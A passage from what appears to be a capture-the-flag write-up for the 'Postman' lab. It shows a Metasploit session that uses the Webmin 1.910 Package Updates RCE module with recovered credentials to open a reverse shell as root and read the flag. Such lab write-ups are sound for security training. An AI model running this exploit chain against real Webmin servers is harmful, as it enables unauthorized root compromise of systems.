![[Pasted image 20250701200832.png]]
Default credentials such as `admin:admin`, `postman:postman`, etc. did not work and RCE exploits for Webmin all require some form of authentication. We will keep this in mind later when we start to obtain some credentials.

We see that the Webmin version is 1.910 and we can further view exploits to see which fits best. The particular exploit we will use it `exploit/linux/http/Webmin_packageup_rce`: Description: This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the "Package Updates" module can execute arbitrary commands with root privileges.

If Matt is part of the "Package Updates" module, we will be able to get a reverse shell as root and be able to read the flag.

```bash
msf5 > use exploit/linux/http/Webmin_packageup_rce
msf5 exploit(linux/http/Webmin_packageup_rce) > set LHOST 10.10.14.54
LHOST => 10.10.14.54
msf5 exploit(linux/http/Webmin_packageup_rce) > set RHOST postman.htb
RHOST => postman.htb
msf5 exploit(linux/http/Webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf5 exploit(linux/http/Webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf5 exploit(linux/http/Webmin_packageup_rce) > set SSL true
SSL => true
msf5 exploit(linux/http/Webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.54:4444 
[+] Session cookie: d7c9f0b81683e4db959da275e60a1a30
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.54:4444 -> 10.10.10.160:36766)

whoami
root
cat /root/root.txt
a25774**************************
```